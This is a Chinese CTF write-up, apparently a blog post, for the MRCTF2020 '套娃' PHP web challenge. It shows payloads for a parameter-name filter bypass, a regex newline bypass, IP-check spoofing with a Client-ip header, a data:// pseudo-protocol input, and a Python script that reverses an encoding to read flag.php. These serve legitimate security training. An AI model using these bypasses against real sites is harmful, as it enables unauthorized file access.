@@ -1,0 +1,674 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="https://cdn.staticaly.com/gh/sawtooth384/image@master/head.3dtemkbaoia0.webp">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[MRCTF2020]套娃先看页面源代码，发现有代码注释：  12345678$query &#x3D; $_SERVER[&amp;#x27;QUERY_STRING&amp;#x27;]; if( substr_count($query, &amp;#x27;_&amp;#x27;) !&#x3D;&#x3D; 0 || substr_count($query, &amp;#x27;%5f&amp;#x27;) !&#x3D; 0 )&amp;#123;    die(&amp;#x27;Y0u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MRCTF2020 套娃">
+<meta property="og:url" content="http://example.com/2023/09/05/[MRCTF2020]%E5%A5%97%E5%A8%83/index.html">
+<meta property="og:site_name" content="sawtooth384的博客">
+<meta property="og:description" content="[MRCTF2020]套娃先看页面源代码，发现有代码注释：  12345678$query &#x3D; $_SERVER[&amp;#x27;QUERY_STRING&amp;#x27;]; if( substr_count($query, &amp;#x27;_&amp;#x27;) !&#x3D;&#x3D; 0 || substr_count($query, &amp;#x27;%5f&amp;#x27;) !&#x3D; 0 )&amp;#123;    die(&amp;#x27;Y0u">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/2023090501.6ntjcld4z0s0.png">
+<meta property="og:image" content="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/2023090502.6ukjogue99o0.png">
+<meta property="og:image" content="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/2023090503.5ki7rsypwl40.webp">
+<meta property="og:image" content="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/20230504.4zo7re19ers0.webp">
+<meta property="og:image" content="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/20230505.2yo0imubqss0.webp">
+<meta property="og:image" content="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/20230506.6qujc55rgp80.webp">
+<meta property="article:published_time" content="2023-09-05T02:31:23.000Z">
+<meta property="article:modified_time" content="2023-09-05T03:51:46.692Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="正则">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/2023090501.6ntjcld4z0s0.png">
+  
+  
+  
+  <title>MRCTF2020 套娃 - sawtooth384的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sawtooth384</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://cdn.staticaly.com/gh/sawtooth384/image@master/BingWallpaper.43exigufdae0.webp') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">MRCTF2020 套娃</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-05 10:31" pubdate>
+          2023年9月5日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">MRCTF2020 套娃</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年9月5日 中午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h1><p>先看页面源代码，发现有代码注释：</p>
+<p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/2023090501.6ntjcld4z0s0.png" alt="2023090501"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br> <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>);<br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to the next ~&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>要传入<code>b_u_p_t</code>参数，但是不能有<code>_</code></p>
+<blockquote>
+<p><strong>注意</strong>:</p>
+<p>变量名中的点和空格被转换成下划线。例如 <code>&lt;input name=&quot;a.b&quot; /&gt;</code> 变成了 <code>$_REQUEST[&quot;a_b&quot;]</code>。</p>
+</blockquote>
+<p>所以我们可以传入<code>b u p t</code>或<code>b.u.p.t</code>实现绕过。</p>
+<p>在正则表达式中<code>^</code>代表从字符串起始处匹配，<code>$</code>代表结尾，<code>/^23333$/</code>要求字符串恰好等于<code>23333</code>。</p>
+<p>所以第二个<code>if</code>语句意思是<code>b_u_p_t</code>的值不能等于(强比较)<code>23333</code>，但要通过正则匹配。</p>
+<p>在非多行模式下(即没有<code>/s</code>)，<code>$</code>会忽略在句尾的<code>%0a</code></p>
+<p>例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^flag$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>只需传入<code>?a=flag%0a</code></p>
+<p>同理，本题中传入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?b.u.p.t=23333%0a<br></code></pre></td></tr></table></figure>
+
+<p>即可。</p>
+<p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/2023090502.6ukjogue99o0.png" alt="2023090502"></p>
+<p>提示flag在<code>secrettw.php</code></p>
+<p>访问并查看页面源代码：</p>
+<p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/2023090503.5ki7rsypwl40.webp" alt="2023090503"></p>
+<p><del>有脏东西</del></p>
+<p>这东西很长，在那一行上双击可快速选中该行。</p>
+<p>这是<code>Jsfuck</code>编码,详情见<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e7246218f424">Jsfuck – 一个很有意思的Javascript特性</a>  </p>
+<p>可以直接使用在线工具解码，比如<a target="_blank" rel="noopener" href="http://www.hiencode.com/jsfuck.html">CTF在线工具-在线JSfuck加密|在线JSfuck解密|JSfuck|JSfuck原理|JSfuck算法 (hiencode.com)</a></p>
+<p>也可以将其复制到浏览器控制台中：</p>
+<p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/20230504.4zo7re19ers0.webp" alt="20230504"></p>
+<p><strong>post me Merak</strong>  </p>
+<p>用post方法传入一个名为<strong>Merak</strong>的变量，变量值随意。</p>
+<p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/20230505.2yo0imubqss0.webp" alt="20230505"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)         <span class="hljs-comment">#ip检测</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;  <br>    <span class="hljs-comment">#考察php伪协议</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;    <span class="hljs-comment">#代码逆向</span><br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>
+
+<h2 id="过ip检测"><a href="#过ip检测" class="headerlink" title="过ip检测"></a>过ip检测</h2><p>添加报文，据我所知有两种方法</p>
+<ul>
+<li><code>X-Forwarded-For: 127.0.0.1</code>    </li>
+<li><code>Client-ip: 127.0.0.1</code></li>
+</ul>
+<p>这里不知道为什么第一个不行，只能使用第二个。</p>
+<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>这里可以使用data伪协议，对于data,</p>
+<p>例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">// 打印 &quot;I love PHP&quot; </span><br>	<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>同理，本题传入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=            #todat is a happy day<br></code></pre></td></tr></table></figure>
+
+<h2 id="代码逆向"><a href="#代码逆向" class="headerlink" title="代码逆向"></a>代码逆向</h2><p>我用python写了个<code>change()</code>的逆向函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"> <br><span class="hljs-comment"># function change($v)&#123; </span><br><span class="hljs-comment">#     $v = base64_decode($v); </span><br><span class="hljs-comment">#     $re = &#x27;&#x27;; </span><br><span class="hljs-comment">#     for($i=0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="hljs-comment">#         $re .= chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="hljs-comment">#     &#125; </span><br><span class="hljs-comment">#     return $re; </span><br><span class="hljs-comment"># &#125; </span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">v</span>):<br>    re=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v)):<br>        re += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(v[i]) - i*<span class="hljs-number">2</span>); <br>    re=base64.b64encode(re.encode())<br>    <span class="hljs-keyword">return</span> re.decode()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    s=<span class="hljs-string">&quot;flag.php&quot;</span>   <br>    <span class="hljs-built_in">print</span>(change(s))<br><span class="hljs-comment">#ZmpdYSZmXGI=</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/20230506.6qujc55rgp80.webp" alt="20230506"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/RCE/">#RCE</a>
+      
+        <a href="/tags/PHP/">#PHP</a>
+      
+        <a href="/tags/%E6%AD%A3%E5%88%99/">#正则</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>MRCTF2020 套娃</div>
+      <div>http://example.com/2023/09/05/[MRCTF2020]套娃/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/04/%5BFBCTF2019%5DRCEService/" title="FBCTF2019 RCEService">
+                        <span class="hidden-mobile">FBCTF2019 RCEService</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
